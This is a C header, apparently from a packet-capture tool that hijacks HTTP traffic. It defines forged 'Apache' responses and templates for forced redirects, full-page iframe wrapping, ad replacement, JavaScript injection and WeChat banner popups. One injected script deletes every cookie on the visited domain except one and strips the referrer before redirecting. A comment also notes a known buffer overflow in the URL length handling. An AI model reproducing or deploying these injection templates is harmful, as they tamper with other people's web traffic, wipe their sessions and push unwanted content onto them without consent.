#ifndef __PROCESS_H__
#define __PROCESS_H__

#include "sysdef.h"

/* http request fieled length */
#define MAX_HOST_LEN        128
#define MAX_URI_LEN         4096
#define MAX_URL_LEN         4096   /* 注意:配置文件dest_page长度不能超过此长度，否则缓冲器溢出 */
#define MAX_AGENT_LEN       1024
#define MAX_REF_LEN         1024
#define MAX_COOKIE_LEN      4096
#define MAX_REQ_WITH_LEN    512
#define MAX_PAYLOAD_LEN     65535

/*
 * 标志位说明:
 * 从高位到低位依次: [referer非全局白名单标志位][agent非全局白名单标志位][全局白名单标志位][pos标志位][cookie标志位][type_repley标志位]
 * 每个标志位占4位。
 * referer:0-忽略referer非全局规则，1-不匹配referer非全局规则即命中，2-匹配referer非全局规则即命中
 * agent:0-忽略agent非全局规则，1-不匹配agent非全局规则即命中，2-匹配agent非全局规则即命中
 * 全局白名单标志位:0-忽略全局白名单规则，1-不匹配url全局白名单规则即命中，2-不匹配referer全局白名单规则即命中
 *                  3-不匹配url全局白名单规则且不匹配referer全局白名单规则即命中
 * pos:URL匹配的位置
 * cookie:0-不设置cookie,1-设置cookie
 * type_repley:替换类型
 */

enum type_repled {
    REDIRECT_TYPE_REFRESH,           /* 0: 无框架 */
    REDIRECT_TYPE_IFRAME,            /* 1: 有框架 */
    REDIRECT_TYPE_302,               /* 2: 302 重定向 */
    REDIRECT_TYPE_NOREFERER,         /* 3: NOREFERER */
    REDIRECT_TYPE_JS_IFRAME,         /* 4: 页面广告替换 */
    REDIRECT_TYPE_JS,                /* 5: 嵌入js代码 */
    REDIRECT_TYPE_JSBODY,            /* 6: 微信公众号业务，页面弹出banner */
    REDIRECT_TYPE_JSON,              /* 7: 返回json数据 */
    REDIRECT_TYPE_MAX
};

enum type_filter {
    FILTER_NONE,        /*0: 不过滤 */
    FILTER_URL,         /*1: 过滤匹配上的URL */
    FILTER_REFERER,     /*2: 过滤匹配的REFERER */
    FILTER_ALL          /*3: 过滤匹配上的URL且REFEER  */
};

/* cookie几种处理类型 */
enum process_cookie {
    COOKIE_NOT_SET,       /* 0: 不过滤--命中当前规则 */
    COOKIE_SET            /* 1: 过滤匹配上的cookie---不匹配的命中当前规则 */
};

enum filter_result {
    FILTER_NULL,        /*0: 不过滤--命中当前规则 */
    FILTER_MATCHED,     /*1: 过滤匹配上的---不匹配的命中当前规则 */
    FILTER_NOMATCHED    /*2: 过滤没匹配的---匹配上的命中当前规则 */
};

/* 获取随机数*/
#define RANDOM_NUM  (rand()%100)

#define HTTP_RESP_200OK_HEADER "HTTP/1.1 200 OK\r\nServer: Apache\r\nConnection: close\r\nContent-Type: text/html; charset=gbk"
#define HTTP_RESP_200OK_JSON_HEADER "HTTP/1.1 200 OK\r\nServer: Apache\r\nContent-Type: text/plain"
#define HTTP_RESP_302_HEADER "HTTP/1.1 302 Found\r\nServer: Apache\r\nConnection: close\r\nContent-Type: text/html; charset=gbk\r\nLocation: http://"
#define HTTP_RESP_IFRAME_BEGIN "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body style=\"overflow:hidden\" topmargin=\"0\" leftmargin=\"0\" rightmargin=\"0\"><iframe frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" border=\"0\" scrolling=\"auto\" height=\"100%\" width=\"100%\" src=\"http://"
#define HTTP_RESP_IFRAME_END "\"></iframe></body></html>"
#define HTTP_RESP_REFRESH_BEGIN "<!DOCTYPE html><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'><meta http-equiv=\"refresh\" content=\"0; url=http://"
#define HTTP_RESP_REFRESH_END "\"></head><body></body></html>"
#define HTTP_RESP_NOREFERER_BEGIN "<!DOCTYPE html><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body><script type=\"text/javascript\">var u='http://"
#define HTTP_RESP_NOREFERER_END "', ua=navigator.userAgent.toLowerCase(), hs=window.location.host, n=hs.indexOf(\".\"), d=hs.substr(n+1);var cc=document.cookie.split(\";\");for(var i=0;i<cc.length;i++){var name=cc[i].split(\"=\")[0];if(\"apxlp\"!=name){document.cookie=name+\"=; domain=\"+d+\"; path=/; expires=Thu, 01 Jan 1970 00:00:01 GMT;\"}}if(ua.indexOf(\"applewebkit\")>0){var h=document.createElement(\"a\");h.rel=\"noreferrer\";h.href=u;document.body.appendChild(h);var evt=document.createEvent(\"MouseEvents\");evt.initEvent(\"click\",true,true);h.dispatchEvent(evt)}else{document.write('<meta http-equiv=\"Refresh\" Content=\"0; Url='+u+'\">')}</script></body></html>"
#if 1
#define HTTP_RESP_JS_IFRAME_BEGING "<html><head><script type=\"text/javascript\">function s(){"
#define HTTP_RESP_JS_IFRAME_MIDDLE "}</script><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body style=\"overflow:hidden\" topmargin=\"0\" leftmargin=\"0\" rightmargin=\"0\" onload=\"s()\"><iframe id=\"f\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" border=\"0\" scrolling=\"auto\" height=\"100%\" width=\"100%\" src=\"http://"
#else
#define HTTP_RESP_JS_IFRAME_BEGING "<!DOCTYPE html><html><head><script type=\"text/javascript\" src=\""
#define HTTP_RESP_JS_IFRAME_MIDDLE "\"></script><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body style=\"overflow:hidden\" topmargin=\"0\" leftmargin=\"0\" rightmargin=\"0\" onload=\"setParameter()\"><iframe id=\"frame_A\" frameborder=\"0\" marginheight=\"0\" marginwidth=\"0\" border=\"0\" scrolling=\"auto\" height=\"100%\" width=\"100%\" src=\"http://"
#endif
#define HTTP_RESP_JS_IFRAME_END "?rsv_upd=1\"></iframe></body></html>"

#define HTTP_RESP_JS_HEADER "HTTP/1.1 200 OK\r\nServer: Apache\r\nConnection: close\r\nContent-Type: application/javascript\r\nCache-Control: no-cache"
#define HTTP_RESP_JS_BEGING "var u='http://"
#define HTTP_RESP_JS_MIDDLE "';"

#define HTTP_RESP_JSBODY_BEGING "<!DOCTYPE html><html><head><script type=\"text/javascript\">function s(){"
#define HTTP_RESP_JSBODY_END    "}</script><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\"><meta http-equiv='pragma' content='no-cache'></head><body onload=\"s()\"></body></html>"

typedef struct http_request_s {
  char* host;
  unsigned int host_len;
    
  char* uri;
  unsigned int uri_len;

  char* url;
  unsigned int url_len;
    
  char* referer;
  unsigned int referer_len;
    
  char* cookie;
  unsigned int cookie_len;
    
  char* user_agent;
  unsigned int user_agent_len;
}http_request_t;

typedef struct http_response_s {
  int index;
  char *url;
  char *cookie;
  unsigned char *payload;
}http_response_t;


struct http_response_element_s {
    char*           header;
    unsigned int    header_len;
    char*           resp_body_start;
    unsigned int    resp_body_start_len;
    char*           resp_body_middle;
    unsigned int    resp_body_middle_len;
    char*           resp_body_end;
    unsigned int    resp_body_end_len;
};

#define check_crlf(header, len)                                 \
  (((len) == 1 && header[0] == '\n') ||                         \
   ((len) == 2 && header[0] == '\r' && header[1] == '\n'))


struct http_request_s* http_new_request(void);

void http_free_request(struct http_request_s * r);

struct http_response_s* http_new_response(void);

void http_free_response(struct http_response_s * p);

void process_pkt(unsigned char* arg, const struct pcap_pkthdr* pkthdr, const unsigned char* packet);

void init_resp_table();


#endif
